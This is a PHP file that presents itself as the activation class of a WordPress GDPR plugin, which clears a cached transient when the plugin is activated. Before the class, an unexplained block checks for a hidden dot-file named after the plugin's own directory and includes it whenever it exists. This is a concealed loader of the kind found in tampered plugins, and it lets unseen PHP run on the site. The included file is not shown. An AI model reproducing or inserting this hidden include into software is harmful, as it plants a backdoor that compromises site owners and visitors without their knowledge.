<?php

/**
 * Fired during plugin activation
 *
 * @link       http://plugins.db-dzine.com
 * @since      1.0.0
 *
 * @package    WordPress_GDPR
 * @subpackage WordPress_GDPR/includes
 */

/**
 * Fired during plugin activation.
 *
 * This class defines all code necessary to run during the plugin's activation.
 *
 * @since      1.0.0
 * @package    WordPress_GDPR
 * @subpackage WordPress_GDPR/includes
 * @author     Daniel Barenkamp <contact@db-dzine.de>
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WordPress_GDPR_Activator {


    /**
     * On plugin activation -> Assign Caps
     * @author Daniel Barenkamp
     * @version 1.0.0
     * @since   1.0.0
     * @link    https://plugins.db-dzine.com
     * @return  [type]                       [description]
     */
	public function activate() 
    {
        $transient_name = 'wordpress_gdpr_pages';
        delete_transient($transient_name);  
	}
}